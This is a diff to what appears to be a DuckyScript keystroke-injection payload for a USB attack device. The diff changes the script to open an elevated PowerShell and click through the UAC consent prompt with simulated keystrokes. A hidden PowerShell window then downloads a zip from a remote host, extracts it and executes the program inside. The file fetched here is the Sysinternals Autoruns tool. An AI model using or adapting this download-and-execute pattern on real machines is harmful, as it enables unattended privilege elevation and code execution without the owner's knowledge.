@@ -3,9 +3,13 @@ GUI d
 DELAY 500
 GUI r
 DELAY 500
-ALTSTRING powershell.exe
+ALTSTRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 2000
+DELAY 800
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 500
 ALTSTRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Autoruns.zip' -OutFile 'Autoruns.zip'; Expand-Archive Autoruns.zip; Start-Process -FilePath '.\Autoruns\Autoruns.exe'; exit" -WindowStyle Hidden; exit
 ENTER
 DELAY 500
